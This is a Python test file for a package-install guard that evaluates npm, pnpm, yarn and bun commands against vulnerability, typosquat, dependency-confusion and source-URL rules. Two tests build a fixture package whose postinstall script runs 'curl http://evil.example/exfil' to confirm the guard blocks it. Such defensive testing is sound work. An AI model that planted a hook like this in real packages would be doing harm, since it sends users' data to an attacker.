"""Phase 11 JavaScript evaluator behavior tests."""

from __future__ import annotations

import base64
import hashlib
import json
from datetime import datetime, timedelta, timezone
from pathlib import Path

import pytest
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives.asymmetric.rsa import RSAPrivateKey, generate_private_key

from codex_plugin_scanner.guard.runtime.package_intent import (
    build_package_request_artifact,
    parse_package_intent,
)
from codex_plugin_scanner.guard.runtime.supply_chain_package_eval import evaluate_package_request_artifact
from codex_plugin_scanner.guard.store import GuardStore

WORKSPACE_ID = "workspace-alpha"


def _write_text(path: Path, text: str) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(text, encoding="utf-8")


def _iso(value: datetime) -> str:
    return value.astimezone(timezone.utc).isoformat().replace("+00:00", "Z")


def _generate_key_pair() -> tuple[bytes, bytes]:
    private_key = generate_private_key(public_exponent=65537, key_size=2048)
    private_pem = private_key.private_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PrivateFormat.PKCS8,
        encryption_algorithm=serialization.NoEncryption(),
    )
    public_pem = private_key.public_key().public_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PublicFormat.SubjectPublicKeyInfo,
    )
    return private_pem, public_pem


def _fingerprint(public_key_pem: bytes) -> str:
    return hashlib.sha256(public_key_pem.decode("utf-8").strip().encode("utf-8")).hexdigest()


def _package(
    *,
    name: str,
    version: str,
    default_action: str,
    namespace: str | None = None,
    normalized_severity: str = "critical",
    recommended_fix_version: str | None = "1.2.9",
) -> dict[str, object]:
    return {
        "confidence": 990,
        "defaultAction": default_action,
        "ecosystem": "npm",
        "exploitLevel": "active",
        "knownExploited": True,
        "malwareState": "known",
        "name": name,
        "namespace": namespace,
        "normalizedSeverity": normalized_severity,
        "packageAgeState": "watch",
        "purl": f"pkg:npm/{namespace}/{name}@{version}" if namespace is not None else f"pkg:npm/{name}@{version}",
        "reachability": "reachable",
        "recommendedFixVersion": recommended_fix_version,
        "relatedAdvisoryIds": ["GHSA-vh95-rmgr-6w4m"],
        "riskScore": 980,
        "sourceIntegrityState": "high-risk",
        "version": version,
    }


def _bundle_response(
    *,
    packages: list[dict[str, object]],
    policy_rules: list[dict[str, object]] | None = None,
) -> dict[str, object]:
    generated_at = datetime(2026, 5, 19, tzinfo=timezone.utc)
    expires_at = generated_at + timedelta(hours=12)
    bundle = {
        "advisories": [
            {
                "advisoryId": "GHSA-vh95-rmgr-6w4m",
                "aliases": ["CVE-2020-7598"],
                "confidence": 990,
                "exploitLevel": "active",
                "knownExploited": True,
                "malwareState": "known",
                "normalizedSeverity": "critical",
                "recommendedFixVersion": "1.2.9",
                "sourceKey": "ghsa",
                "summary": "Prototype pollution in minimist",
                "title": "Prototype pollution in minimist",
            }
        ],
        "bundleVersion": "1747612800000-deadbeef",
        "expiresAt": _iso(expires_at),
        "feedSnapshotHash": "feed-snapshot-1",
        "generatedAt": _iso(generated_at),
        "keyId": "guard-bundle-key-2026-05",
        "packages": packages,
        "policyHash": "policy-hash-1",
        "policyRules": policy_rules or [],
        "scoringVersion": "scf-v1",
        "sourceHashes": [{"payloadHash": "ghsa-feed-hash", "sourceKey": "ghsa", "staleStatus": "fresh"}],
        "tier": "premium",
        "workspaceId": WORKSPACE_ID,
    }
    private_key_pem, public_key_pem = _generate_key_pair()
    loaded_key = serialization.load_pem_private_key(private_key_pem, password=None)
    assert isinstance(loaded_key, RSAPrivateKey)
    canonical_payload = json.dumps(bundle, sort_keys=True, separators=(",", ":")).encode("utf-8")
    payload_hash = hashlib.sha256(canonical_payload).hexdigest()
    signature = loaded_key.sign(
        canonical_payload,
        padding.PSS(mgf=padding.MGF1(hashes.SHA256()), salt_length=padding.PSS.MAX_LENGTH),
        hashes.SHA256(),
    )
    return {
        "bundle": bundle,
        "payloadHash": payload_hash,
        "signature": base64.b64encode(signature).decode("utf-8"),
        "signatureAlgorithm": "rsa-pss-sha256",
        "verificationKeys": [
            {
                "fingerprintSha256": _fingerprint(public_key_pem),
                "keyId": "guard-bundle-key-2026-05",
                "publicKeyPem": public_key_pem.decode("utf-8").strip(),
                "state": "active",
                "validUntil": None,
            }
        ],
    }


def _artifact_from_command(command: str, *, workspace: Path) -> object:
    intent = parse_package_intent(command, workspace=workspace)
    assert intent is not None
    return build_package_request_artifact("codex", intent, config_path="codex.json", source_scope="project")


def test_evaluate_package_request_artifact_uses_package_lock_exact_version_for_npm_ranges(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    home_dir = tmp_path / "home"
    workspace_dir = tmp_path / "workspace"
    workspace_dir.mkdir()
    _write_text(workspace_dir / "package.json", '{"name":"demo","dependencies":{"minimist":"^1.2.0"}}\n')
    _write_text(
        workspace_dir / "package-lock.json",
        '{"lockfileVersion":3,"packages":{"":{"dependencies":{"minimist":"^1.2.0"}},"node_modules/minimist":{"version":"1.2.8"}}}\n',
    )
    store = GuardStore(home_dir)
    monkeypatch.setattr(store, "get_cloud_workspace_id", lambda: WORKSPACE_ID)
    store.cache_supply_chain_bundle(
        WORKSPACE_ID,
        _bundle_response(packages=[_package(name="minimist", version="1.2.8", default_action="block")]),
        "2026-05-19T00:00:00Z",
    )

    artifact = _artifact_from_command("npm install minimist@^1.2.0", workspace=workspace_dir)
    result = evaluate_package_request_artifact(artifact=artifact, store=store, workspace_dir=workspace_dir)

    assert result.decision == "block"
    assert result.packages[0]["requestedVersion"] == "^1.2.0"
    assert result.packages[0]["resolvedVersion"] == "1.2.8"


def test_evaluate_package_request_artifact_allows_recommended_safe_npm_version(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    home_dir = tmp_path / "home"
    workspace_dir = tmp_path / "workspace"
    workspace_dir.mkdir()
    _write_text(workspace_dir / "package.json", '{"name":"demo"}\n')
    store = GuardStore(home_dir)
    monkeypatch.setattr(store, "get_cloud_workspace_id", lambda: WORKSPACE_ID)
    store.cache_supply_chain_bundle(
        WORKSPACE_ID,
        _bundle_response(packages=[_package(name="minimist", version="1.2.8", default_action="block")]),
        "2026-05-19T00:00:00Z",
    )

    artifact = _artifact_from_command("npm install minimist@1.2.9", workspace=workspace_dir)
    result = evaluate_package_request_artifact(artifact=artifact, store=store, workspace_dir=workspace_dir)

    assert result.decision == "allow"
    assert result.policy_action == "allow"


@pytest.mark.parametrize(
    ("command", "expected_next_step"),
    [
        ("pnpm add minimist@1.2.8", "pnpm add minimist@1.2.9"),
        ("yarn add minimist@1.2.8", "yarn add minimist@1.2.9"),
        ("bun add minimist@1.2.8", "bun add minimist@1.2.9"),
    ],
)
def test_evaluate_package_request_artifact_uses_manager_specific_fix_command(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    command: str,
    expected_next_step: str,
) -> None:
    home_dir = tmp_path / "home"
    workspace_dir = tmp_path / "workspace"
    workspace_dir.mkdir()
    _write_text(workspace_dir / "package.json", '{"name":"demo"}\n')
    store = GuardStore(home_dir)
    monkeypatch.setattr(store, "get_cloud_workspace_id", lambda: WORKSPACE_ID)
    store.cache_supply_chain_bundle(
        WORKSPACE_ID,
        _bundle_response(packages=[_package(name="minimist", version="1.2.8", default_action="block")]),
        "2026-05-19T00:00:00Z",
    )

    artifact = _artifact_from_command(command, workspace=workspace_dir)
    result = evaluate_package_request_artifact(artifact=artifact, store=store, workspace_dir=workspace_dir)

    assert result.decision == "block"
    assert result.user_copy.next_step == expected_next_step


@pytest.mark.parametrize(
    ("command", "expected_decision", "expected_code"),
    [
        ("npm install guard-github@github:hashgraph-online/hol-guard", "warn", "git_dependency_source"),
        ("npm install guard-http@http://example.com/guard.tgz", "block", "insecure_source_url"),
        ("npm install guard-https@https://example.com/guard.tgz", "warn", "external_tarball_source"),
        ("npm install guard-query@https://example.com/guard.tgz?token=demo", "warn", "external_tarball_source"),
    ],
)
def test_evaluate_package_request_artifact_applies_js_source_heuristics(
    tmp_path: Path,
    command: str,
    expected_decision: str,
    expected_code: str,
) -> None:
    home_dir = tmp_path / "home"
    workspace_dir = tmp_path / "workspace"
    workspace_dir.mkdir()
    _write_text(workspace_dir / "package.json", '{"name":"demo"}\n')
    store = GuardStore(home_dir)

    artifact = _artifact_from_command(command, workspace=workspace_dir)
    result = evaluate_package_request_artifact(artifact=artifact, store=store, workspace_dir=workspace_dir)

    assert result.decision == expected_decision
    assert result.packages[0]["reasons"][0]["code"] == expected_code


def test_evaluate_package_request_artifact_uses_source_specific_risk_summary_for_warned_tarballs(
    tmp_path: Path,
) -> None:
    home_dir = tmp_path / "home"
    workspace_dir = tmp_path / "workspace"
    workspace_dir.mkdir()
    _write_text(workspace_dir / "package.json", '{"name":"demo"}\n')
    store = GuardStore(home_dir)

    artifact = _artifact_from_command(
        "npm install guard-query@https://example.com/guard.tgz?token=demo", workspace=workspace_dir
    )
    result = evaluate_package_request_artifact(artifact=artifact, store=store, workspace_dir=workspace_dir)

    assert result.decision == "warn"
    assert "external tarball source" in result.risk_summary.lower()


def test_evaluate_package_request_artifact_npm_audit_fix_scans_existing_lockfile_context(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    home_dir = tmp_path / "home"
    workspace_dir = tmp_path / "workspace"
    workspace_dir.mkdir()
    _write_text(workspace_dir / "package.json", '{"name":"demo"}\n')
    _write_text(
        workspace_dir / "package-lock.json",
        '{"dependencies":{"minimist":{"version":"1.2.8"}}}\n',
    )
    store = GuardStore(home_dir)
    monkeypatch.setattr(store, "get_cloud_workspace_id", lambda: WORKSPACE_ID)
    store.cache_supply_chain_bundle(
        WORKSPACE_ID,
        _bundle_response(packages=[_package(name="minimist", version="1.2.8", default_action="block")]),
        "2026-05-19T00:00:00Z",
    )

    artifact = _artifact_from_command("npm audit fix --package-lock-only", workspace=workspace_dir)
    result = evaluate_package_request_artifact(artifact=artifact, store=store, workspace_dir=workspace_dir)

    assert result.decision == "block"
    assert result.packages[0]["dependencyPath"] in {"minimist", "node_modules/minimist"}


def test_evaluate_package_request_artifact_blocks_local_package_with_install_scripts(tmp_path: Path) -> None:
    home_dir = tmp_path / "home"
    workspace_dir = tmp_path / "workspace"
    workspace_dir.mkdir()
    _write_text(workspace_dir / "package.json", '{"name":"demo"}\n')
    _write_text(
        workspace_dir / "fixtures" / "evil-package" / "package.json",
        '{"name":"evil-package","scripts":{"postinstall":"curl http://evil.example/exfil"}}\n',
    )
    store = GuardStore(home_dir)

    artifact = _artifact_from_command("npm install ./fixtures/evil-package", workspace=workspace_dir)
    result = evaluate_package_request_artifact(artifact=artifact, store=store, workspace_dir=workspace_dir)

    assert result.decision == "block"
    assert result.packages[0]["name"] == "evil-package"
    assert result.packages[0]["reasons"][0]["code"] == "install_script_risk"


def test_evaluate_package_request_artifact_allows_local_package_when_ignore_scripts_is_set(tmp_path: Path) -> None:
    home_dir = tmp_path / "home"
    workspace_dir = tmp_path / "workspace"
    workspace_dir.mkdir()
    _write_text(workspace_dir / "package.json", '{"name":"demo"}\n')
    _write_text(
        workspace_dir / "fixtures" / "evil-package" / "package.json",
        '{"name":"evil-package","scripts":{"postinstall":"curl http://evil.example/exfil"}}\n',
    )
    store = GuardStore(home_dir)

    artifact = _artifact_from_command("npm install --ignore-scripts ./fixtures/evil-package", workspace=workspace_dir)
    result = evaluate_package_request_artifact(artifact=artifact, store=store, workspace_dir=workspace_dir)

    assert result.decision == "allow"
    assert result.packages[0]["reasons"][0]["code"] == "ignore_scripts_applied"


def test_evaluate_package_request_artifact_uses_alias_in_fix_copy(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    home_dir = tmp_path / "home"
    workspace_dir = tmp_path / "workspace"
    workspace_dir.mkdir()
    _write_text(workspace_dir / "package.json", '{"name":"demo"}\n')
    store = GuardStore(home_dir)
    monkeypatch.setattr(store, "get_cloud_workspace_id", lambda: WORKSPACE_ID)
    store.cache_supply_chain_bundle(
        WORKSPACE_ID,
        _bundle_response(packages=[_package(name="minimist", version="1.2.8", default_action="block")]),
        "2026-05-19T00:00:00Z",
    )

    artifact = _artifact_from_command("npm install guard-safe@npm:minimist@1.2.8", workspace=workspace_dir)
    result = evaluate_package_request_artifact(artifact=artifact, store=store, workspace_dir=workspace_dir)

    assert result.decision == "block"
    assert result.packages[0]["alias"] == "guard-safe"
    assert result.user_copy.next_step == "npm install guard-safe@npm:minimist@1.2.9"


def test_evaluate_package_request_artifact_blocks_dependency_confusion_targets_from_policy(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    home_dir = tmp_path / "home"
    workspace_dir = tmp_path / "workspace"
    workspace_dir.mkdir()
    _write_text(workspace_dir / "package.json", '{"name":"demo"}\n')
    store = GuardStore(home_dir)
    monkeypatch.setattr(store, "get_cloud_workspace_id", lambda: WORKSPACE_ID)
    store.cache_supply_chain_bundle(
        WORKSPACE_ID,
        _bundle_response(
            packages=[],
            policy_rules=[
                {
                    "action": "block",
                    "ruleId": "reserve-internal-tool",
                    "ecosystemSelector": "npm",
                    "enabled": True,
                    "expiresAt": None,
                    "harnessSelector": None,
                    "packageSelector": "@hashgraph/internal-tool",
                    "priority": 1,
                    "severityThreshold": None,
                    "versionRangeSelector": None,
                }
            ],
        ),
        "2026-05-19T00:00:00Z",
    )

    artifact = _artifact_from_command("npm install internal-tool@1.0.0", workspace=workspace_dir)
    result = evaluate_package_request_artifact(artifact=artifact, store=store, workspace_dir=workspace_dir)

    assert result.decision == "block"
    assert result.packages[0]["reasons"][0]["code"] == "dependency_confusion_risk"


def test_evaluate_package_request_artifact_matches_js_package_names_exactly_for_typosquat_bundle_entries(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    home_dir = tmp_path / "home"
    workspace_dir = tmp_path / "workspace"
    workspace_dir.mkdir()
    _write_text(workspace_dir / "package.json", '{"name":"demo"}\n')
    store = GuardStore(home_dir)
    monkeypatch.setattr(store, "get_cloud_workspace_id", lambda: WORKSPACE_ID)
    store.cache_supply_chain_bundle(
        WORKSPACE_ID,
        _bundle_response(packages=[_package(name="crossenv", version="7.0.0", default_action="block")]),
        "2026-05-19T00:00:00Z",
    )

    bad_artifact = _artifact_from_command("npm install crossenv@7.0.0", workspace=workspace_dir)
    good_artifact = _artifact_from_command("npm install cross-env@7.0.0", workspace=workspace_dir)

    bad_result = evaluate_package_request_artifact(artifact=bad_artifact, store=store, workspace_dir=workspace_dir)
    good_result = evaluate_package_request_artifact(artifact=good_artifact, store=store, workspace_dir=workspace_dir)

    assert bad_result.decision == "block"
    assert good_result.decision == "monitor"
    assert good_result.packages[0]["reasons"][0]["code"] == "no_cached_match"


def test_evaluate_package_request_artifact_records_bun_lockb_binary_fallback(tmp_path: Path) -> None:
    home_dir = tmp_path / "home"
    workspace_dir = tmp_path / "workspace"
    workspace_dir.mkdir()
    _write_text(workspace_dir / "package.json", '{"name":"demo"}\n')
    (workspace_dir / "bun.lockb").write_bytes(b"bunlock")
    store = GuardStore(home_dir)

    artifact = _artifact_from_command("bun add left-pad@1.3.0", workspace=workspace_dir)
    result = evaluate_package_request_artifact(artifact=artifact, store=store, workspace_dir=workspace_dir)

    assert result.decision == "monitor"
    assert result.packages[0]["reasons"][0]["code"] == "bun_lockfile_binary_fallback"
    assert "binary lockfile" in result.reasons[0]["message"]


@pytest.mark.parametrize(
    ("bundle_name", "bundle_namespace", "command"),
    [
        ("demo", None, "npm install @scope/demo@1.0.0"),
        ("demo", "@scope", "npm install demo@1.0.0"),
    ],
)
def test_evaluate_package_request_artifact_avoids_scoped_package_name_collisions(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    bundle_name: str,
    bundle_namespace: str | None,
    command: str,
) -> None:
    home_dir = tmp_path / "home"
    workspace_dir = tmp_path / "workspace"
    workspace_dir.mkdir()
    _write_text(workspace_dir / "package.json", '{"name":"demo"}\n')
    store = GuardStore(home_dir)
    monkeypatch.setattr(store, "get_cloud_workspace_id", lambda: WORKSPACE_ID)
    store.cache_supply_chain_bundle(
        WORKSPACE_ID,
        _bundle_response(
            packages=[
                _package(
                    name=bundle_name,
                    namespace=bundle_namespace,
                    version="1.0.0",
                    default_action="block",
                )
            ]
        ),
        "2026-05-19T00:00:00Z",
    )

    artifact = _artifact_from_command(command, workspace=workspace_dir)
    result = evaluate_package_request_artifact(artifact=artifact, store=store, workspace_dir=workspace_dir)

    assert result.decision == "monitor"
    assert result.packages[0]["reasons"][0]["code"] == "no_cached_match"
